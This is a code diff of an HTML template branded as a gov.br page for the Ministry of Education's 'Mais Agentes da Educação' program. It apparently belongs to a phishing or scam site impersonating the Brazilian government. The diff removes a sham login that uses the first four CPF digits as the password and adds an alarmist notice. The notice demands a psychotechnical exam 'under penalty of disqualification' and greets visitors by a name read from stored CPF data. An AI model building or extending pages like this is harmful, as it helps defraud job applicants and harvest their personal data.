@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>{{ page_title or "SGTE - Sistema de Gestão do Trabalho e da Educação - gov.br" }}</title>
+    <title>Agendamento Psicotécnico - Mais Agentes da Educação - gov.br</title>
     
     <!-- External CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
@@ -12,11 +12,6 @@
     
     <!-- Custom CSS -->
     <link rel="stylesheet" href="{{ url_for('static', filename='css/custom.css') }}">
-    
-    <!-- SEO and Meta Tags -->
-    <meta name="description" content="SGTE - Sistema de Gestão do Trabalho e da Educação">
-    <meta name="keywords" content="educação, governo federal, agentes educação, SGTE, cadastro">
-    <meta name="author" content="Governo Federal do Brasil">
     
     <!-- Favicon -->
     <link rel="icon" type="image/x-icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🇧🇷</text></svg>">
@@ -46,7 +41,7 @@
                 </button>
                 <a href="{{ url_for('login') }}" class="bg-blue-700 text-white px-4 py-2 rounded-full flex items-center hover:bg-blue-800 transition-colors text-sm font-medium">
                     <i class="fas fa-user mr-2"></i>
-                    Entrar
+                    <span id="user-name-header">Entrar</span>
                 </a>
             </div>
         </div>
@@ -68,54 +63,98 @@
                 </button>
             </div>
         </div>
+
+        <!-- Search Bar (hidden by default) -->
+        <div id="search-bar" class="hidden bg-white border-b border-gray-300 px-4 py-3">
+            <div class="flex items-center max-w-md mx-auto">
+                <div class="relative flex-1">
+                    <input type="text" 
+                           id="header-search-input" 
+                           placeholder="Buscar programas, vagas, ministérios..." 
+                           class="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600 focus:ring-2 focus:ring-blue-200">
+                    <button id="header-search-btn" class="absolute right-2 top-2 text-blue-600 hover:text-blue-800">
+                        <i class="fas fa-search"></i>
+                    </button>
+                </div>
+                <button id="search-close-btn" class="ml-3 text-gray-500 hover:text-gray-700">
+                    <i class="fas fa-times"></i>
+                </button>
+            </div>
+        </div>
     </header>
 
     <!-- Main Content -->
-    <main class="container mx-auto px-4 py-8" style="max-width: 600px;">
-        <div class="text-center mb-8">
-            <h1 class="text-3xl font-bold text-blue-800 mb-2">Seja bem-vindo(a) ao SGTE</h1>
-            <h2 class="text-xl text-gray-700 mb-6">Secretaria de Gestão do Trabalho e da Educação</h2>
+    <main class="container mx-auto max-w-4xl px-4 py-8">
+        <div class="bg-yellow-50 border border-yellow-200 rounded-lg p-8 mb-8">
+            <h1 class="text-2xl font-bold text-yellow-800 mb-6 flex items-center">
+                <i class="fas fa-exclamation-triangle mr-3 text-yellow-600"></i>
+                Atenção
+            </h1>
             
-            <!-- Logo do Ministério da Educação -->
-            <div class="mb-8">
-                <img src="{{ url_for('static', filename='images/ministerio-educacao-logo.png') }}" 
-                     alt="Ministério da Educação" 
-                     class="mx-auto h-32 object-contain">
+            <div class="space-y-4 text-gray-800">
+                <p class="text-lg leading-relaxed">
+                    Para confirmar sua participação na prova do Programa Mais Agentes da Educação, é <strong>obrigatório</strong> realizar o agendamento do Exame Psicotécnico em uma UBS (Unidade Básica de Saúde) próxima ao endereço informado no cadastro.
+                </p>
+                
+                <p class="text-lg leading-relaxed bg-red-50 border border-red-200 rounded p-4">
+                    <i class="fas fa-exclamation-circle text-red-600 mr-2"></i>
+                    Este exame é uma <strong>exigência oficial</strong> do processo seletivo e o laudo deverá ser apresentado no dia da prova, <strong>sob pena de desclassificação</strong>.
+                </p>
             </div>
         </div>
 
-        <!-- Formulário de Login SGTE -->
-        <div class="bg-white border border-gray-200 rounded-lg p-8 shadow-sm">
-            <form id="sgteLoginForm">
-                <div class="mb-6">
-                    <label for="email" class="block text-sm font-medium text-gray-700 mb-2">E-mail</label>
-                    <input type="email" 
-                           id="email" 
-                           readonly
-                           class="w-full px-4 py-3 border border-gray-300 rounded-md bg-gray-50 text-gray-600"
-                           value="">
-                    <p class="text-xs text-gray-500 mt-1">utilize o mesmo e-mail cadastrado no programa mais agentes da educação</p>
+        <!-- Informações Adicionais -->
+        <div class="bg-blue-50 border border-blue-200 rounded-lg p-6 mb-8">
+            <h2 class="text-xl font-semibold text-blue-800 mb-4 flex items-center">
+                <i class="fas fa-info-circle mr-2"></i>
+                Informações Importantes
+            </h2>
+            
+            <ul class="space-y-3 text-gray-700">
+                <li class="flex items-start">
+                    <i class="fas fa-check-circle text-blue-600 mr-3 mt-1"></i>
+                    <span>O agendamento deve ser realizado até 15 dias antes da data da prova</span>
+                </li>
+                <li class="flex items-start">
+                    <i class="fas fa-check-circle text-blue-600 mr-3 mt-1"></i>
+                    <span>Leve documento oficial com foto e comprovante de residência</span>
+                </li>
+                <li class="flex items-start">
+                    <i class="fas fa-check-circle text-blue-600 mr-3 mt-1"></i>
+                    <span>O exame é gratuito e deve ser realizado no SUS</span>
+                </li>
+                <li class="flex items-start">
+                    <i class="fas fa-check-circle text-blue-600 mr-3 mt-1"></i>
+                    <span>Guarde o laudo original para apresentar no dia da prova</span>
+                </li>
+            </ul>
+        </div>
+
+        <!-- Próximos Passos -->
+        <div class="bg-green-50 border border-green-200 rounded-lg p-6">
+            <h2 class="text-xl font-semibold text-green-800 mb-4 flex items-center">
+                <i class="fas fa-calendar-check mr-2"></i>
+                Próximos Passos
+            </h2>
+            
+            <div class="space-y-4">
+                <div class="flex items-start">
+                    <span class="bg-green-600 text-white rounded-full w-6 h-6 flex items-center justify-center text-sm font-bold mr-3 mt-1">1</span>
+                    <span class="text-gray-700">Localize a UBS mais próxima do seu endereço</span>
                 </div>
-
-                <div class="mb-6">
-                    <label for="senha" class="block text-sm font-medium text-gray-700 mb-2">Senha</label>
-                    <input type="password" 
-                           id="senha" 
-                           maxlength="4"
-                           class="w-full px-4 py-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
-                           placeholder="Digite os 4 primeiros dígitos do seu CPF">
-                    <p class="text-xs text-gray-500 mt-1">sua senha padrão são os 4 primeiros dígitos do seu CPF</p>
+                <div class="flex items-start">
+                    <span class="bg-green-600 text-white rounded-full w-6 h-6 flex items-center justify-center text-sm font-bold mr-3 mt-1">2</span>
+                    <span class="text-gray-700">Entre em contato para agendar o exame psicotécnico</span>
                 </div>
-
-                <button type="submit" 
-                        class="w-full bg-blue-600 text-white py-3 px-6 rounded-md font-medium hover:bg-blue-700 transition-colors mb-4">
-                    Entrar
-                </button>
-            </form>
-
-            <p class="text-center text-sm text-gray-600">
-                Acesse o Sistema SGTE para efetivar seu cadastro no programa Mais Agentes da Educação.
-            </p>
+                <div class="flex items-start">
+                    <span class="bg-green-600 text-white rounded-full w-6 h-6 flex items-center justify-center text-sm font-bold mr-3 mt-1">3</span>
+                    <span class="text-gray-700">Realize o exame na data agendada</span>
+                </div>
+                <div class="flex items-start">
+                    <span class="bg-green-600 text-white rounded-full w-6 h-6 flex items-center justify-center text-sm font-bold mr-3 mt-1">4</span>
+                    <span class="text-gray-700">Aguarde os próximos comunicados sobre a data da prova</span>
+                </div>
+            </div>
         </div>
     </main>
 
@@ -135,8 +174,17 @@
             <!-- Navigation Menu -->
             <nav aria-label="Menu principal do rodapé">
                 <ul>
-                    <li class="py-3">
+                    <li class="border-t border-gray-600 py-3 flex justify-between items-center">
                         <a href="#" class="text-sm hover:text-gray-300">MEC</a>
+                        <button class="footer-expand-btn" aria-label="Expandir seção MEC">
+                            <i class="fas fa-chevron-down text-xs"></i>
+                        </button>
+                    </li>
+                    <li class="border-t border-gray-600 py-3 flex justify-between items-center">
+                        <a href="{{ url_for('acoes_programas') }}" class="text-sm hover:text-gray-300">AÇÕES E PROGRAMAS</a>
+                        <button class="footer-expand-btn" aria-label="Expandir seção Ações e Programas">
+                            <i class="fas fa-chevron-down text-xs"></i>
+                        </button>
                     </li>
                     <li class="border-t border-gray-600 py-3 flex justify-between items-center">
                         <a href="#" class="text-sm hover:text-gray-300">EDUCAÇÃO BÁSICA</a>
@@ -157,7 +205,7 @@
                         </button>
                     </li>
                     <li class="border-t border-gray-600 py-3 flex justify-between items-center">
-                        <a href="#" class="text-sm hover:text-gray-300">ACESSO À INFORMAÇÃO</a>
+                        <a href="{{ url_for('acesso_informacao') }}" class="text-sm hover:text-gray-300">ACESSO À INFORMAÇÃO</a>
                         <button class="footer-expand-btn" aria-label="Expandir seção Acesso à Informação">
                             <i class="fas fa-chevron-down text-xs"></i>
                         </button>
@@ -226,64 +274,19 @@
     <!-- JavaScript -->
     <script>
     document.addEventListener('DOMContentLoaded', function() {
-        // Preencher email do usuário - verificar múltiplas fontes e dados completos
-        let emailSalvo = localStorage.getItem('emailUsuario') || 
-                        sessionStorage.getItem('emailUsuario') || 
-                        localStorage.getItem('email') || '';
-        
-        // Se não encontrou email diretamente, verificar nos dados completos
-        if (!emailSalvo) {
-            const dadosCompletos = localStorage.getItem('dadosInscricao');
-            if (dadosCompletos) {
-                try {
-                    const dados = JSON.parse(dadosCompletos);
-                    emailSalvo = dados.email || '';
-                } catch(e) {
-                    console.log('Erro ao ler dados de inscrição:', e);
-                }
-            }
-        }
-        
-        console.log('Email encontrado:', emailSalvo);
-        console.log('Todos os dados no localStorage:', Object.keys(localStorage));
-        
-        if (emailSalvo) {
-            const emailInput = document.getElementById('email');
-            if (emailInput) {
-                emailInput.value = emailSalvo;
-                console.log('Email preenchido no campo:', emailSalvo);
-            }
-        } else {
-            console.log('Nenhum email encontrado no localStorage');
-        }
-
-        // Obter CPF para validação da senha
+        // Preencher nome do usuário no cabeçalho
         const dadosCpf = JSON.parse(localStorage.getItem('dadosCpfValidado') || '{}');
-        const cpfCompleto = dadosCpf.cpf || '';
-        const senhaCorreta = cpfCompleto.substring(0, 4);
-
-        // Formulário de login
-        document.getElementById('sgteLoginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const senhaDigitada = document.getElementById('senha').value;
-            
-            if (senhaDigitada === senhaCorreta) {
-                // Senha correta - redirecionar para próxima página
-                window.location.href = '/agendamento-psicotecnico';
-            } else {
-                // Senha incorreta
-                alert('Senha incorreta. Utilize os 4 primeiros dígitos do seu CPF.');
-                document.getElementById('senha').value = '';
-                document.getElementById('senha').focus();
+        if (dadosCpf.nome) {
+            const primeiroNome = dadosCpf.nome.split(' ')[0];
+            const userNameHeader = document.getElementById('user-name-header');
+            if (userNameHeader) {
+                userNameHeader.textContent = primeiroNome;
             }
-        });
-
-        // Permitir apenas números no campo senha
-        document.getElementById('senha').addEventListener('input', function(e) {
-            this.value = this.value.replace(/\D/g, '');
-        });
+        }
     });
     </script>
+    
+    <!-- JavaScript do gov.br -->
+    <script src="{{ url_for('static', filename='js/main.js') }}"></script>
 </body>
 </html>
